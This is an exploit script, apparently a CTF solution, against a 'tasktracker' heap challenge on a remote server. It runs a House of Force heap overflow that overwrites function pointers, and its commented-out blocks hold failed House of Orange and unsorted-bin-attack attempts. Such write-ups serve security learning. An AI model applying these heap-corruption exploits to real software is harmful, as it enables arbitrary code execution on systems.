from pwnscripts import *
context.binary = 'tasktracker'
#r = context.binary.process()
r = remote('ctf-f3jj.balancedcompo.site', 9997)

def select(i: int): r.sendlineafter('choice:', str(i))
def pad_num(length: int):
    assert(abs(length)<10000000//(1 if length > 0 else 10)) # must be 7 digits or less
    return str(length)+'\0'
def add(length: int, name: bytes):
    select(2)
    r.sendafter("length of task name:", pad_num(length))
    r.sendafter('name of task:', name)
def change(idx: int, length: int, name: bytes):
    select(3)
    r.sendafter('change:', pad_num(idx))
    r.sendafter('name:', pad_num(length))
    r.sendafter('name:', name)
from re import findall
def grabint(s: bytes): return findall(b'[0-9]+', s)[0]
def list_tasks():
    select(1)
    tasks = {}
    msg = b''
    while b'Task Number' in (s:=r.recvline()): msg += s
    for s in msg.split(b'Task Number: ')[1:]:
        num = int(s[:s.find(b' ')])
        name = s[s.find(b'Name : ')+len('Name : '):]
        tasks[num] = name
    return tasks

context.log_level = 'debug'
# This is the last minute discovery I made: the function pointers for the switch-case exist on the heap.
# The obvious solution is to use House of Force to overwrite the function pointers for RCE.
add(0x18, b'A'*0x18)
add(0x18, b'B'*0x18)
change(1, 0x28, b'B'*0x18 + pack(-1, sign=True))
add(-0x80, b'ignore')
print_flag = 0x400d51
add(0x18, pack(print_flag))
select(2)
r.interactive()
exit()

""" # idea 1: overflow on the top chunk twice to leak the heap.
add(0x18, b'A'*0x18)
add(0x18, b'B'*0x18)
change(1, 0x28, b'B'*0x18 + pack(-1, sign=True))

add(-0x158, b'ignore')
add(0x18, b'C'*0x7)
change(3, 0x20, b'C'*0x18 + pack(-1, sign=True))
#gdb.attach(r)
add(-0x118, b'')

heap_leak = unpack_many_bytes(list_tasks()[4])
print(heap_leak)
# failed because you can't add a chunk without adding a nul-byte
"""

""" # ideas 2 & 3
tasks = 0x0006CCBC0
io_list_all = 0x6CB0C0
print_flag = 0x400d51

add(0x7a0, b'A') #0x21001
add(0x390, b'B') #0x20c01
change(1, 0x400, b'B'*0x398 + pack(0xc01))
add(0x1000, b'C')
''' Idea 2: use house of orange to directly execute print_flag
add(tasks, b'replace `tasks` with function to jump to')
top_chunk = fit({
    0x00: b'/bin/sh\0',
    0x08: 0x61,
    0x18: io_list_all-0x10,
    0xc0: 0,
    0x20: 2,
    0x28: 3,
    0xd8: tasks+0x30-0x18
})
change(1, 0x500, b'B'*0x390 + top_chunk)
''' # This fails because the statically linked libc version is actually larger than 2.25. You can figure this out by looking for a few specific malloc error strings

# idea 3: Use House-of-Force + Unsorted bin attack to leak heap, and THEN overwrite malloc_hook by another House-of-Force relative allocation.
top_chunk = fit({
    0x00: pack(0xbe1),
    0x08: pack(tasks+8),
    0x10: pack(tasks+8+0x30)
})
change(1, 0x500, b'B'*0x398 + top_chunk)
add(0xbd8, b'D')
heap_leak = unpack(list_tasks()[1+3].ljust(8, b'\0'))
heap_base = 0x15e7010-0x15c3000
log.info(hex(heap_leak)) # note that there's ~1/256 chance of failure because of nul-ASLR bytes
# The heap leak actually works! unfortunately, the unsorted-bin-attack causes the next allocation to always raise a segfault in _int_malloc....
change(3, 0xc00, 0xbe0*b'D' + pack(-1, sign=True))
"""
